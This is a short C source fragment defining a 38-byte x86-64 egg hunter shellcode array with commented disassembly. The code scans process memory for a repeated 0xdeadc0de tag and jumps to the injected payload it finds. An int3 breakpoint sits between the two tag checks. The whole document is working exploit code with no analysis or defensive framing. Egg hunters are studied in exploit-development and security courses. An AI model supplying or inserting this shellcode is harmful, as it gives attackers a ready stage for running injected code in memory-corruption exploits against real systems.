
#define EGG_SIZE 38

char EGG[] = {
  /* 0000 */ "\x31\xff"             /* xor edi, edi        */
  /* 0002 */ "\xf7\xe7"             /* mul edi             */
  /* 0004 */ "\x96"                 /* xchg esi, eax       */
  /* 0005 */ "\xb6\x10"             /* mov dh, 0x10        */
  /* 0007 */ "\x48\x01\xd7"         /* add rdi, rdx        */
  /* 000A */ "\x57"                 /* push rdi            */
  /* 000B */ "\x83\xc7\x04"         /* add edi, 0x4        */
  /* 000E */ "\x6a\x15"             /* push 0x15           */
  /* 0010 */ "\x58"                 /* pop rax             */
  /* 0011 */ "\x0f\x05"             /* syscall             */
  /* 0013 */ "\x5f"                 /* pop rdi             */
  /* 0014 */ "\x3c\xf2"             /* cmp al, 0xf2        */
  /* 0016 */ "\x74\xef"             /* jz 0x7              */
  /* 0018 */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
  /* 001D */ "\xaf"                 /* scasd               */
  /* 001E */ "\x75\xea"             /* jnz 0xa             */
  /* 0020 */ "\xcc"                 /* int3                */
  /* 0021 */ "\xaf"                 /* scasd               */
  /* 0022 */ "\x75\xe6"             /* jnz 0xa             */
  /* 0024 */ "\xff\xe7"             /* jmp rdi             */
};